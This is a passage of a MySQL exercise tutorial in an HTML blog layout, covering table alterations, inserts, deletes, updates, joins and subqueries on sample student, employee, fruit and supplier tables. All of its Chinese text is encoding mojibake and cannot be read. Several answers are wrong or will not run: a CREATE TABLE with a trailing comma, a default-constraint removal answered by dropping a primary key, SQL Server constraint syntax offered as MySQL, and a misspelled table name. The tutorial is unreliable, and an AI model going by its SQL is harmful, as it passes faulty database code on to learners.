stuscore;</p><p><strong>2.å°†æ•°æ®è¡¨stuScoreä¸­çš„å­—æ®µscoreçš„æ•°æ®ç±»å‹ä¿®æ”¹ä¸ºsmallintã€‚</strong></p><p>è€ƒç‚¹ï¼šmodify</p><p>Alter table stuScore <strong>modify(ä¿®æ­£ï¼Œæ›´æ­£)</strong> score smallint;</p><p><a href="https://www.runoob.com/mysql/mysql-data-types.html" target="_blank" rel="noopener">MySQL æ•°æ®ç±»å‹</a></p><p>åŸæ¥æ˜¯intï¼ˆå¤§æ•´æ•°å€¼ï¼‰ç°åœ¨æ”¹ä¸ºsmallintï¼ˆå¤§æ•´æ•°å€¼ï¼‰ï¼Œåè€…ç›¸å¯¹äºå‰è€…çš„èŒƒå›´ç”±42äº¿ï¼ˆ10ä½æ•°ï¼‰å˜ä¸ºäº†6ä¸‡ï¼ˆ5ä½æ•°ï¼‰</p><p><strong>3.å°†æ•°æ®è¡¨teacherä¸­çš„å­—æ®µTnameçš„é•¿åº¦ä¿®æ”¹ä¸º30.</strong>  </p><p>è€ƒç‚¹ï¼šmodify</p><p>Alter table teacher <strong>modify</strong> tname varchar(30);</p><p><strong>4.åœ¨æ•°æ®è¡¨teacherä¸­æœ€åä½ç½®æ·»åŠ å­—æ®µTageï¼Œæ•°æ®ç±»å‹ä¸ºsmallintï¼Œçº¦æŸæ¡ä»¶ä¸ä¸ºç©ºã€‚</strong></p><p>è€ƒç‚¹ï¼šadd</p><p>Alter table teacher <strong>add</strong> tage smallint not null;  </p><p><strong>5.åœ¨ æ•°æ®è¡¨teacherä¸­æœ€åä½ç½®æ·»åŠ å­—æ®µlocationï¼Œæ•°æ®ç±»å‹ä¸ºvarcharï¼Œé•¿åº¦ä¸º50ã€‚</strong></p><p>è€ƒç‚¹ï¼šadd</p><p>Alter table teacher <strong>add</strong> location varchar(50);    </p><p><strong>6.å°†æ•°æ®è¡¨teacherä¸­locationå­—æ®µçš„å­—æ®µåï¼Œä¿®æ”¹ä¸ºlocï¼Œå…¶æ•°æ®ç±»å‹ä¸ºcharï¼Œé•¿åº¦60ã€‚</strong>  </p><p>è€ƒç‚¹ï¼šchange</p><p>Alter table teacher <strong>change</strong> location loc char(60); </p><p><strong>7.å°†æ•°æ®è¡¨teacherä¸­locå­—æ®µè°ƒæ•´åˆ°â€œTnameâ€å­—æ®µä¹‹åã€‚</strong> </p><p>è€ƒç‚¹ï¼šafter</p><p>Alter table teacher modify loc char(60) <strong>after</strong> tname;</p><p><strong>8.å°†æ•°æ®è¡¨teacherä¸­çš„locå­—æ®µåˆ é™¤ã€‚</strong>  </p><p>Alter table teacher <strong>drop</strong> loc;</p><p><strong>9.ä¸ºæ•°æ®è¡¨studentä¸­çš„å­—æ®µssexæ·»åŠ é»˜è®¤å€¼çº¦æŸï¼Œé»˜è®¤å€¼ä¸ºâ€˜ç”·â€™ã€‚</strong> </p><p>Alter table student add constraint(å¼ºåˆ¶ï¼Œçº¦æŸ) student_ssex default(â€˜ç”·â€™) for ssex;</p><p>Alter table student add constraint student_ssex default(â€˜ç”·â€™) for ssex;</p><p><strong>10.ä¸ºæ•°æ®è¡¨stuScoreä¸­çš„å­—æ®µSnoæ·»åŠ ä¸»é”®çº¦æŸã€‚</strong></p><p>Alter table stuScore <strong>add constraint</strong> stuScore_sno <strong>primary key(sno)</strong>;</p><p><strong>11.åˆ é™¤æ•°æ®è¡¨teacherä¸»é”®çº¦æŸ</strong></p><p>Alter table teacher drop primary key;(ç”±äºä¸€ä¸ªè¡¨ä¸­åªæœ‰ä¸€ä¸ªä¸»é”®ï¼Œæ‰€ä»¥ç›´æ¥åˆ é™¤ä¸»é”®å°±å¯ä»¥)</p><p><strong>12.åˆ é™¤æ•°æ®è¡¨studentä¸­Ssexçš„é»˜è®¤å€¼çº¦æŸ</strong> </p><p>Alter table student drop constraint stuScore_sno primary key(sno);ï¼ˆæŠ¥é”™ï¼‰</p><p>Alter table student drop primary key;ï¼ˆå¯è¡Œï¼‰</p><p><strong>13.åˆ é™¤æ•°æ®è¡¨teacher</strong>  </p><p>Drop table teacher;</p><h3 id="äº”ã€æ’å…¥æ•°æ®"><a href="#äº”ã€æ’å…¥æ•°æ®" class="headerlink" title="äº”ã€æ’å…¥æ•°æ®"></a><strong>äº”ã€æ’å…¥æ•°æ®</strong></h3><h4 id="1ã€å‘studentæ•°æ®è¡¨ä¸­æ’å…¥å››æ¡æ•°æ®"><a href="#1ã€å‘studentæ•°æ®è¡¨ä¸­æ’å…¥å››æ¡æ•°æ®" class="headerlink" title="1ã€å‘studentæ•°æ®è¡¨ä¸­æ’å…¥å››æ¡æ•°æ®"></a>1ã€å‘studentæ•°æ®è¡¨ä¸­æ’å…¥å››æ¡æ•°æ®</h4><table><thead><tr><th>Sno</th><th>sname</th><th>sage</th><th>ssex</th></tr></thead><tbody><tr><td>2017001</td><td>ç‹ä¼Ÿ</td><td>18</td><td>ç”·</td></tr><tr><td>2017002</td><td>å®‹æ±Ÿ</td><td>20</td><td>ç”·</td></tr><tr><td>2017003</td><td>å¼ ä¸½</td><td>18</td><td>å¥³</td></tr><tr><td>2017004</td><td>ææ˜¥</td><td>19</td><td>å¥³</td></tr></tbody></table><p>Insert into student(sno,sname,sage,ssex) values (â€˜2017001â€™,â€™iceâ€™,18,â€™manâ€™),(â€˜2017002â€™,â€™bergâ€™,20,â€™manâ€™),(â€˜2017003â€™,â€™Yangâ€™,18,â€™womâ€™),(â€˜2017004â€™,â€™8rrettâ€™,19,â€™womâ€™);</p><h4 id="2ã€å‘courseæ•°æ®è¡¨ä¸­æ’å…¥ä¸‰æ¡æ•°æ®"><a href="#2ã€å‘courseæ•°æ®è¡¨ä¸­æ’å…¥ä¸‰æ¡æ•°æ®" class="headerlink" title="2ã€å‘courseæ•°æ®è¡¨ä¸­æ’å…¥ä¸‰æ¡æ•°æ®"></a>2ã€å‘courseæ•°æ®è¡¨ä¸­æ’å…¥ä¸‰æ¡æ•°æ®</h4><table><thead><tr><th>Cno</th><th>Cname</th><th>Tno</th></tr></thead><tbody><tr><td>C001</td><td>JAVA</td><td>T01</td></tr><tr><td>C002</td><td>MYSQL</td><td>T02</td></tr><tr><td>C003</td><td>LINUX</td><td>T03</td></tr></tbody></table><p>Insert into course(cno,cname,tno) values(â€˜c01â€™,â€™JAVAâ€™,â€™t01â€™),(â€˜c02â€™,â€™MYSQLâ€™,â€™t01â€™),(â€˜c03â€™,â€™LINUXâ€™,â€™t01â€™);</p><h3 id="å…­ã€æ˜¾ç¤ºæ•°æ®"><a href="#å…­ã€æ˜¾ç¤ºæ•°æ®" class="headerlink" title="å…­ã€æ˜¾ç¤ºæ•°æ®"></a><strong>å…­ã€æ˜¾ç¤ºæ•°æ®</strong></h3><p><strong>1ã€æŸ¥è¯¢studentæ•°æ®è¡¨ä¸­æ‰€æœ‰çš„â€˜manâ€™å­¦ç”Ÿã€‚</strong> </p><p>Select <em>  from student where ssex<em>*=</em></em>â€˜manâ€™; </p><p><strong>2.æŸ¥è¯¢studentæ•°æ®è¡¨ä¸­æ‰€æœ‰å§“â€˜Yâ€™çš„å­¦ç”Ÿã€‚</strong> </p><p> Select <em> from student where sname <em>*like</em></em> â€˜Y%â€™;</p><p><strong>3ã€æŸ¥è¯¢studentæ•°æ®è¡¨ä¸­å¹´é¾„åœ¨19-20ä¹‹é—´çš„å­¦ç”Ÿã€‚</strong> </p><p>Select <em> from student where sage <em>*between</em></em> 19 and 20;</p><h3 id="ä¸ƒã€åˆ é™¤æ•°æ®"><a href="#ä¸ƒã€åˆ é™¤æ•°æ®" class="headerlink" title="ä¸ƒã€åˆ é™¤æ•°æ®"></a><strong>ä¸ƒã€åˆ é™¤æ•°æ®</strong></h3><p><strong>1ã€åˆ é™¤æ•°æ®è¡¨studentä¸­çš„Snoä¸º2017004çš„å­¦ç”Ÿè®°å½•</strong> </p><p>Delete from student where sno=â€™2017004â€™;</p><p><strong>2ã€åˆ é™¤æ•°æ®è¡¨studentä¸­çš„Ssexä¸ºå¥³çš„å­¦ç”Ÿè®°å½•</strong>    </p><p> Delete from student where ssex=â€™womâ€™;</p><h3 id="å…«ã€å¢åŠ æ•°æ®"><a href="#å…«ã€å¢åŠ æ•°æ®" class="headerlink" title="å…«ã€å¢åŠ æ•°æ®"></a><strong>å…«ã€å¢åŠ æ•°æ®</strong></h3><p><strong>1ã€å‘æ•°æ®è¡¨studentä¸­æ·»åŠ ä¸€æ¡è®°å½•</strong>ï¼Œï¼ˆâ€˜2017005â€™ï¼Œâ€˜zhangâ€™ï¼Œ18ï¼Œâ€˜manâ€™ï¼‰ </p><p><strong>Insert  into</strong> student values(â€˜2017005â€™,â€™zhangâ€™,18,â€™manâ€™);</p><p><strong>2ã€å‘æ•°æ®è¡¨courseä¸­æ·»åŠ ä¸€æ¡è®°å½•</strong>ï¼Œï¼ˆâ€˜c004â€™ï¼Œâ€˜computernetâ€™ï¼Œâ€˜T04â€™ï¼‰</p><p> <strong>Insert into</strong> course values(â€˜c004â€™,â€™computernetâ€™,â€™T04 â€˜);  </p><h3 id="ä¹ã€ä¿®æ”¹æ•°æ®"><a href="#ä¹ã€ä¿®æ”¹æ•°æ®" class="headerlink" title="ä¹ã€ä¿®æ”¹æ•°æ®"></a><strong>ä¹ã€ä¿®æ”¹æ•°æ®</strong></h3><p>1ã€å°†studentè¡¨ä¸­å­¦ç”Ÿ2017001çš„å¹´é¾„æ”¹ä¸º22å²ã€‚  </p><p><strong>Update</strong> student <strong>set sage</strong>=22 where sno=â€™2017001â€™;</p><p>2ã€å°†courseæ•°æ®è¡¨ä¸­Cnameä¸ºâ€™LINUXâ€™çš„è¯¾ç¨‹åä¿®æ”¹ä¸ºâ€™ LINUXcoolâ€™ã€‚ </p><p>Update course set cname=â€™ LINUXcoolâ€™  where cname=â€™LINUXâ€™;</p><h2 id="ç¬¬äºŒéƒ¨åˆ†"><a href="#ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†"></a>ç¬¬äºŒéƒ¨åˆ†</h2><p>å•è¡¨æŸ¥è¯¢å’Œå¤šè¡¨æŸ¥è¯¢ç»ƒä¹ </p><p>åˆ›å»ºæ•°æ®è¡¨employeeï¼ˆå‘˜å·¥è¡¨ï¼‰</p><pre><code>CREATE TABLE employee(e_no    INT NOT NULL PRIMARY KEY,e_name   VARCHAR(100) NOT NULL,e_gender  CHAR(2) NOT NULL,dept_no  INT NOT NULL,e_job    VARCHAR(100) NOT NULL,e_salary  SMALLINT NOT NULL,hireDate  DATE,);</code></pre><p>å‘employeeè¡¨ä¸­æ’å…¥æ•°æ®</p><pre><code>INSERT INTO employee VALUES (1001, &#39;SMITH&#39;, &#39;m&#39;,20, &#39;CLERK&#39;,800,&#39;2005-11-12&#39;),(1002, &#39;ALLEN&#39;, &#39;f&#39;,30, &#39;SALESMAN&#39;, 1600,&#39;2003-05-12&#39;),(1003, &#39;WARD&#39;, &#39;f&#39;,30, &#39;SALESMAN&#39;, 1250,&#39;2003-05-12&#39;),(1004, &#39;JONES&#39;, &#39;m&#39;,20, &#39;MANAGER&#39;, 2975,&#39;1998-05-18&#39;),(1005, &#39;MARTIN&#39;, &#39;m&#39;,30, &#39;SALESMAN&#39;, 1250,&#39;2001-06-12&#39;), (1006, &#39;BLAKE&#39;, &#39;f&#39;,30, &#39;MANAGER&#39;, 2850,&#39;1997-02-15&#39;),(1007, &#39;CLARK&#39;, &#39;m&#39;,10, &#39;MANAGER&#39;, 2450,&#39;2002-09-12&#39;),(1008, &#39;SCOTT&#39;, &#39;m&#39;,20, &#39;ANALYST&#39;, 3000,&#39;2003-05-12&#39;),(1009, &#39;KING&#39;, &#39;f&#39;,10, &#39;PRESIDENT&#39;, 5000,&#39;1995-01-01&#39;),(1010, &#39;TURNER&#39;, &#39;f&#39;,30, &#39;SALESMAN&#39;, 1500,&#39;1997-10-12&#39;),(1011, &#39;ADAMS&#39;, &#39;m&#39;,20, &#39;CLERK&#39;, 1100,&#39;1999-10-05&#39;),(1012, &#39;JAMES&#39;, &#39;m&#39;,30, &#39;CLERK&#39;, 950,&#39;2008-06-15&#39;);</code></pre><p>åˆ›å»ºæ•°æ®è¡¨deptï¼ˆéƒ¨é—¨è¡¨ï¼‰</p><pre><code>CREATE TABLE dept(d_no     INT NOT NULL PRIMARY KEY AUTO_INCREMENT,d_name    VARCHAR(50),d_location   VARCHAR(100));</code></pre><p>å‘deptè¡¨ä¸­æ’å…¥æ•°æ®</p><pre><code>INSERT INTO dept VALUES (10, &#39;ACCOUNTING&#39;, &#39;ShangHai&#39;),(20, &#39;RESEARCH &#39;, &#39;BeiJing &#39;),(30, &#39;SALES &#39;, &#39;ShenZhen &#39;),(40, &#39;OPERATIONS &#39;, &#39;FuJian &#39;);</code></pre><p>ç»ƒä¹ ï¼š</p><p><strong>1.åœ¨employeeè¡¨ä¸­ï¼ŒæŸ¥è¯¢æ‰€æœ‰è®°å½•çš„e_noã€e_nameå’Œe_salaryå­—æ®µå€¼ã€‚</strong></p><p> select e_no,e_name,e_salary from employee;</p><p><strong>2.åœ¨employeeè¡¨ä¸­ï¼ŒæŸ¥è¯¢dept_noç­‰äº10å’Œ20çš„æ‰€æœ‰è®°å½•ã€‚</strong></p><p> select * from employee where dept_no=10 or dept_no=20;</p><p><strong>3.åœ¨employeeè¡¨ä¸­ï¼ŒæŸ¥è¯¢å·¥èµ„èŒƒå›´åœ¨800~2500ä¹‹é—´çš„å‘˜å·¥ä¿¡æ¯ã€‚</strong></p><p>select * from employee where e_salary between 800 and 2500;</p><p><strong>4.åœ¨employeeè¡¨ä¸­ï¼ŒæŸ¥è¯¢éƒ¨é—¨ç¼–å·ä¸º20çš„éƒ¨é—¨ä¸­çš„å‘˜å·¥ä¿¡æ¯ã€‚</strong></p><p>select * from employee where dept_no=20;</p><p><strong>5.åœ¨employeeè¡¨ä¸­ï¼ŒæŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨æœ€é«˜å·¥èµ„çš„å‘˜å·¥ä¿¡æ¯ã€‚</strong></p><p>ç¬¬ä¸€æ­¥:æ¯ä¸ªéƒ¨é—¨æœ€é«˜å·¥èµ„<br>SELECT MAX(e_salary) AS salary1 FROM employee GROUP BY dept_no;<br>ç¬¬äºŒæ­¥:</p><p>SELECT * FROM employee WHERE e_salary IN( SELECT MAX(e_salary) AS salary1 FROM employee GROUP BY dept_no );</p><p><strong>6.æŸ¥è¯¢å‘˜å·¥BLAKEæ‰€åœ¨éƒ¨é—¨å’Œéƒ¨é—¨æ‰€åœ¨åœ°ã€‚</strong></p><p>åˆ†æ: æŸ¥è¯¢ç»“æœ: d_name d_location(åœ¨è¡¨deptä¸­)<br>æ¡ä»¶: e_name = â€˜æå¼ºâ€™<br>å†…è¿æ¥:</p><p>select d_name,d_location,e_name from emloyee inner join dept on dept_no = d_no where e_name = â€˜blakeâ€™</p><p>7.ä½¿ç”¨è¿æ¥æŸ¥è¯¢ï¼ŒæŸ¥è¯¢æ‰€æœ‰å‘˜å·¥çš„éƒ¨é—¨å’Œéƒ¨é—¨ä¿¡æ¯ã€‚</p><p>8.åœ¨employeeè¡¨ä¸­ï¼Œè®¡ç®—æ¯ä¸ªéƒ¨é—¨å„æœ‰å¤šå°‘åå‘˜å·¥ã€‚</p><p>9.åœ¨employeeè¡¨ä¸­ï¼Œè®¡ç®—ä¸åŒç±»å‹èŒå·¥çš„æ€»å·¥èµ„æ•°ã€‚</p><p>10.åœ¨employeeè¡¨ä¸­ï¼Œè®¡ç®—ä¸åŒéƒ¨é—¨çš„å¹³å‡å·¥èµ„ã€‚</p><p>11.åœ¨employeeè¡¨ä¸­ï¼ŒæŸ¥è¯¢å·¥èµ„ä½äº1500çš„å‘˜å·¥ä¿¡æ¯ã€‚</p><p>12.åœ¨employeeè¡¨ä¸­ï¼Œå°†æŸ¥è¯¢è®°å½•å…ˆæŒ‰éƒ¨é—¨ç¼–å·ç”±é«˜åˆ°ä½æ’åˆ—ï¼Œå†æŒ‰å‘˜å·¥å·¥èµ„ç”±é«˜åˆ°ä½æ’åˆ—ã€‚</p><p>13.åœ¨employeeè¡¨ä¸­ï¼ŒæŸ¥è¯¢åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå·¥é¾„å¤§äºç­‰äº10å¹´çš„å‘˜å·¥ä¿¡æ¯ã€‚</p><p>ç¬¬ä¸‰éƒ¨åˆ†</p><p>å¤šè¡¨è¿æ¥ç»ƒä¹ </p><p>æ–°å»ºæ•°æ®åº“dblx1ï¼Œæ–°å»º5ä¸ªæ•°æ®è¡¨ï¼š</p><p>Create database dblx1;</p><p>Use dblx1;</p><p>1.æ–°å»ºæ•°æ®è¡¨fruits</p><p>CREATE TABLE fruits</p><p>(</p><p>f_id  char(8)   NOT NULL,</p><p>s_id  INT    NOT NULL,</p><p>f_name char(255) NOT NULL,</p><p>f_price decimal(10,2) NOT NULL,</p><p>PRIMARY KEY(f_id) </p><p>);</p><p>INSERT INTO fruits (f_id, s_id, f_name, f_price)</p><p>   VALUES(â€˜a1â€™, 81,â€™appleâ€™,5.2),</p><p>   (â€˜b1â€™,81,â€™blackberryâ€™, 8.2),</p><p>   (â€˜bs1â€™,82,â€™orangeâ€™, 11.2),</p><p>   (â€˜bs2â€™,85,â€™melonâ€™,8.2),</p><p>   (â€˜t1â€™,82,â€™bananaâ€™, 8.3),</p><p>   (â€˜t2â€™,82,â€™grapeâ€™, 5.3),</p><p>   (â€˜o2â€™,83,â€™coconutâ€™, 9.2),</p><p>   (â€˜c0â€™,81,â€™cherryâ€™, 3.2),</p><p>   (â€˜a2â€™,83, â€˜apricotâ€™,2.2),</p><p>   (â€˜l2â€™,84,â€™lemonâ€™, 6.4),</p><p>   (â€˜b2â€™,84,â€™berryâ€™, 7.6),</p><p>   (â€˜m1â€™,86,â€™mangoâ€™, 15.6),</p><p>   (â€˜m2â€™,85,â€™xbabayâ€™, 2.6),</p><p>   (â€˜t4â€™,87,â€™xbababaâ€™, 3.6),</p><p>   (â€˜m3â€™,85,â€™xxttâ€™, 11.6),</p><p>   (â€˜b5â€™,87,â€™xxxxâ€™, 3.6);</p><p>2.åˆ›å»ºæ•°æ®è¡¨suppliers</p><p>CREATE TABLE suppliers</p><p>(</p><p> s_id   int   NOT NULL AUTO_INCREMENT,</p><p> s_name  char(50) NOT NULL,</p><p> s_city  char(50) NULL,</p><p> s_zip   char(8) NULL,</p><p> s_call  CHAR(50) NOT NULL,</p><p> PRIMARY KEY (s_id)</p><p>) ;</p><p>INSERT INTO suppliers(s_id, s_name,s_city, s_zip, s_call)</p><p>VALUES(81,â€™FastFruit Inc.â€™,â€™Tianjinâ€™,â€™300000â€™,â€™48075â€™),</p><p>(82,â€™LT Suppliesâ€™,â€™Chongqingâ€™,â€™400000â€™,â€™44333â€™),</p><p>(83,â€™ACMEâ€™,â€™Shanghaiâ€™,â€™200000â€™,â€™90046â€™),</p><p>(84,â€™FNK Inc.â€™,â€™Zhongshanâ€™,â€™528437â€™,â€™11111â€™),</p><p>(85,â€™Good Setâ€™,â€™Taiyuangâ€™,â€™030000â€™, â€˜22222â€™),</p><p>(86,â€™Just Eat Oursâ€™,â€™Beijingâ€™,â€™08â€™, â€˜45678â€™),</p><p>(87,â€™DK Inc.â€™,â€™Zhengzhouâ€™,â€™450000â€™, â€˜33332â€™);</p><p>3.åˆ›å»ºè¡¨orders</p><p>CREATE TABLE orders</p><p>(</p><p> o_num int   NOT NULL AUTO_INCREMENT,</p><p> o_date datetime NOT NULL,</p><p> c_id  int   NOT NULL,</p><p> PRIMARY KEY (o_num)</p><p>) ;</p><p>INSERT INTO orders(o_num, o_date, c_id)</p><p>VALUES(30001, â€˜2008-09-01â€™, 8001),</p><p>(30002, â€˜2008-09-12â€™, 8003),</p><p>(30003, â€˜2008-09-30â€™, 8004),</p><p>(30004, â€˜2008-8-03â€™, 8005),</p><p>(30005, â€˜2008-8-08â€™, 8001);</p><p>4.æ–°å»ºæ•°æ®è¡¨orderitems</p><p>CREATE TABLE orderitems</p><p>(</p><p> o_num   int     NOT NULL,</p><p> o_item   int     NOT NULL,</p><p> f_id    char(8)   NOT NULL,</p><p> quantity  int     NOT NULL,</p><p> item_price decimal(8,2) NOT NULL,</p><p> PRIMARY KEY (o_num,o_item)</p><p>) ;</p><p>INSERT INTO orderitems(o_num, o_item, f_id, quantity, item_price)</p><p>VALUES(30001, 1, â€˜a1â€™, 8, 5.2),</p><p>(30001, 2, â€˜b2â€™, 3, 7.6),</p><p>(30001, 3, â€˜bs1â€™, 5, 11.2),</p><p>(30001, 4, â€˜bs2â€™, 15, 9.2),</p><p>(30002, 1, â€˜b3â€™, 2, 20.0),</p><p>(30003, 1, â€˜c0â€™, 80, 8),</p><p>(30004, 1, â€˜o2â€™, 50, 2.50),</p><p>(30005, 1, â€˜c0â€™, 5, 8),</p><p>(30005, 2, â€˜b1â€™, 8, 8.99),</p><p>(30005, 3, â€˜a2â€™, 8, 2.2),</p><p>(30005, 4, â€˜m1â€™, 5, 14.99);</p><p>5.åˆ›å»ºæ•°æ®è¡¨customers</p><p>CREATE TABLE customers</p><p>(</p><p> c_id   int    NOT NULL AUTO_INCREMENT,</p><p> c_name  char(50) NOT NULL,</p><p> c_address char(50) NULL,</p><p> c_city  char(50) NULL,</p><p> c_zip   char(8) NULL,</p><p> c_contact char(50) NULL,</p><p> c_email  char(255) NULL,</p><p> PRIMARY KEY (c_id)</p><p>);</p><p>INSERT INTO customers(c_id, c_name, c_address, c_city, </p><p>c_zip, c_contact, c_email) </p><p>VALUES(8001, â€˜RedHookâ€™, â€˜200 Street â€˜, â€˜Tianjinâ€™, </p><p> â€˜300000â€™, â€˜LiMingâ€™, â€˜LMing@163.comâ€™),</p><p>(8002, â€˜Starsâ€™, â€˜333 Fromage Laneâ€™,</p><p> â€˜Dalianâ€™, â€˜116000â€™, â€˜Zhangboâ€™,â€˜Jerry@hotmail.comâ€™),</p><p>(8003, â€˜Netbhoodâ€™, â€˜1 Sunny Placeâ€™, â€˜Qingdaoâ€™, â€˜266000â€™,</p><p> â€˜LuoCongâ€™, NULL),</p><p>(8004, â€˜JOTOâ€™, â€˜829 Riverside Driveâ€™, â€˜Haikouâ€™, </p><p> â€˜570000â€™, â€˜YangShanâ€™, â€˜sam@hotmail.comâ€™);</p><p>ä¸€ã€å¤šè¡¨è¿æ¥ç»ƒä¹ </p><p>1.åœ¨fruitsè¡¨å’Œsuppliersè¡¨ä¹‹é—´ä½¿ç”¨å†…è¿æ¥æŸ¥è¯¢ã€‚</p><p>æŸ¥è¯¢ä¹‹å‰ï¼ŒæŸ¥çœ‹ä¸¤ä¸ªè¡¨çš„ç»“æ„ï¼š</p><p> DESC fruits;</p><p> DESC suppliers;</p><p>ç”±ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œfruitsè¡¨å’Œsuppliersè¡¨ä¸­éƒ½æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„å­—æ®µs_idï¼Œä¸¤ä¸ªè¡¨é€šè¿‡s_idå­—æ®µå»ºç«‹è”ç³»ã€‚</p><p>ä»fruitsè¡¨ä¸­æŸ¥è¯¢f_nameã€f_priceå­—æ®µï¼Œä»suppliersè¡¨ä¸­æŸ¥è¯¢s_idã€s_nameï¼ŒSQLè¯­å¥å¦‚ä¸‹ï¼š</p><p> SELECT suppliers.s_id, s_name,f_name, f_price</p><p>   FROM fruits ,suppliers</p><p>   WHERE fruits.s_id = suppliers.s_id;</p><p>2.åœ¨fruitsè¡¨å’Œsuppliersè¡¨ä¹‹é—´ï¼Œä½¿ç”¨INNER JOINè¯­æ³•è¿›è¡Œå†…è¿æ¥æŸ¥è¯¢ã€‚</p><p>SELECT suppliers.s_id, s_name,f_name, f_price</p><p>   FROM fruits INNER JOIN suppliers</p><p>   ON fruits.s_id = suppliers.s_id;</p><p>3.åœ¨customersè¡¨å’Œordersè¡¨ä¸­ï¼ŒæŸ¥è¯¢æ‰€æœ‰å®¢æˆ·ï¼ŒåŒ…æ‹¬æ²¡æœ‰è®¢å•çš„å®¢æˆ·ã€‚</p><p>SELECT customers.c_id, orders.o_num</p><p>   FROM customers LEFT OUTER JOIN orders</p><p>   ON customers.c_id = orders.c_id;</p><p>4.åœ¨customersè¡¨å’Œordersè¡¨ä¸­ï¼Œä½¿ç”¨INNER JOINè¯­æ³•æŸ¥è¯¢customersè¡¨ä¸­IDä¸º8001çš„å®¢æˆ·çš„è®¢å•ä¿¡æ¯ã€‚</p><p>5.åœ¨customersè¡¨å’Œordersè¡¨ä¸­ï¼ŒæŸ¥è¯¢æ‰€æœ‰è®¢å•ï¼ŒåŒ…æ‹¬æ²¡æœ‰å®¢æˆ·çš„è®¢å•ã€‚</p><p>SELECT customers.c_id, orders.o_num</p><p>   FROM customers RIGHT OUTER JOIN orders</p><p>   ON customers.c_id = orders.c_id;</p><p>6.åœ¨customersè¡¨å’Œordersè¡¨ä¸­ï¼Œä½¿ç”¨INNER JOINè¯­æ³•æŸ¥è¯¢customersè¡¨ä¸­IDä¸º8001çš„å®¢æˆ·çš„è®¢å•ä¿¡æ¯ã€‚</p><p>SELECT customers.c_id, orders.o_num</p><p>   FROM customers INNER JOIN orders</p><p>   ON customers.c_id = orders.c_id AND customers.c_id = 8001;</p><p>7.åœ¨fruitsè¡¨å’Œsuppliersè¡¨ä¹‹é—´ï¼Œä½¿ç”¨INNER JOINè¯­æ³•è¿›è¡Œå†…è¿æ¥æŸ¥è¯¢ï¼Œå¹¶å¯¹æŸ¥è¯¢ç»“æœæ’åºã€‚</p><p>SELECT suppliers.s_id, s_name,f_name, f_price</p><p>   FROM fruits INNER JOIN suppliers</p><p>   ON fruits.s_id = suppliers.s_id</p><p>   ORDER BY fruits.s_id;</p><p>8.æŸ¥è¯¢suppliersè¡¨ä¸­æ˜¯å¦å­˜åœ¨s_id=87çš„ä¾›åº”å•†ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™æŸ¥è¯¢fruitsè¡¨ä¸­çš„è®°å½•ã€‚</p><p>SELECT * FROM fruits</p><p>   WHERE EXISTS</p><p>   (SELECT s_name FROM suppliers WHERE s_id = 87);</p><p>9.æŸ¥è¯¢suppliersè¡¨ä¸­æ˜¯å¦å­˜åœ¨s_id=87çš„ä¾›åº”å•†ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™æŸ¥è¯¢fruitsè¡¨ä¸­çš„f_priceå¤§äº8.20çš„è®°å½•ã€‚</p><p>SELECT * FROM fruits</p><p>   WHERE f_price&gt;8.20 AND EXISTS</p><p>   (SELECT s_name FROM suppliers WHERE s_id = 87);</p><p>10.æŸ¥è¯¢suppliersè¡¨ä¸­æ˜¯å¦å­˜åœ¨s_id=87çš„ä¾›åº”å•†ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™æŸ¥è¯¢fruitsè¡¨ä¸­çš„è®°å½•ã€‚</p><p>SELECT * FROM fruits</p><p>   WHERE NOT EXISTS</p><p>   (SELECT s_name FROM suppliers WHERE s_id = 87);</p><p>11.åœ¨orderitemsè¡¨ä¸­æŸ¥è¯¢f_idä¸ºc0çš„è®¢å•å·ï¼Œå¹¶æ ¹æ®è®¢å•å·æŸ¥è¯¢å…·æœ‰è®¢å•å·çš„å®¢æˆ·c_idã€‚</p><p>SELECT c_id FROM orders WHERE o_num IN</p><p>   (SELECT o_num FROM orderitems WHERE f_id = â€˜c0â€™);</p><p>12.åœ¨suppliersè¡¨ä¸­æŸ¥è¯¢s_cityç­‰äºâ€œTianjinâ€çš„ä¾›åº”å•†s_idï¼Œç„¶ååœ¨fruitsè¡¨ä¸­æŸ¥è¯¢æ‰€æœ‰è¯¥ä¾›åº”å•†æä¾›çš„æ°´æœçš„ç§ç±»ã€‚</p><p>SELECT s_id, f_name FROM fruits</p><p>WHERE s_id =</p><p>(SELECT s1.s_id FROM suppliers AS s1 WHERE s1.s_city = â€˜Tianjinâ€™);</p><p>13.åœ¨suppliersè¡¨ä¸­æŸ¥è¯¢s_cityç­‰äºâ€œTianjinâ€çš„ä¾›åº”å•†s_idï¼Œç„¶ååœ¨fruitsè¡¨ä¸­æŸ¥è¯¢æ‰€æœ‰éè¯¥ä¾›åº”å•†æä¾›çš„æ°´æœçš„ç§ç±»ã€‚</p><p>SELECT s_id, f_name FROM fruits</p><p>   WHERE s_id &lt;&gt;</p><p>   (SELECT s1.s_id FROM suppliers AS s1 WHERE s1.s_city = â€˜Tianjinâ€™);</p><ol><li>å­æŸ¥è¯¢</li></ol><p>CREATE table tbl1 ( num1 INT NOT NULL);</p><p>CREATE table tbl2 ( num2 INT NOT NULL);</p><p>åˆ†åˆ«å‘ä¸¤ä¸ªè¡¨ä¸­æ’å…¥æ•°æ®ï¼š</p><p>INSERT INTO tbl1 values(1), (5), (13), (27);</p><p>INSERT INTO tbl2 values(6), (14), (11), (20);</p><p>ANYå…³é”®å­—æ¥åœ¨ä¸€ä¸ªæ¯”è¾ƒæ“ä½œç¬¦çš„åé¢ï¼Œè¡¨ç¤ºè‹¥ä¸å­æŸ¥è¯¢è¿”å›çš„ä»»ä½•å€¼æ¯”è¾ƒä¸ºTRUEï¼Œåˆ™è¿”å›TRUEã€‚</p><p>è¿”å›tbl2è¡¨çš„æ‰€æœ‰num2åˆ—ï¼Œç„¶åå°†tbl1ä¸­çš„num1çš„å€¼ä¸ä¹‹è¿›è¡Œæ¯”è¾ƒï¼Œåªè¦å¤§äºnum2çš„ä»»ä½•1ä¸ªå€¼ï¼Œå³ä¸ºç¬¦åˆæŸ¥è¯¢æ¡ä»¶çš„ç»“æœã€‚</p><p> SELECT num1 FROM tbl1 WHERE num1 &gt; ANY (SELECT num2 FROM 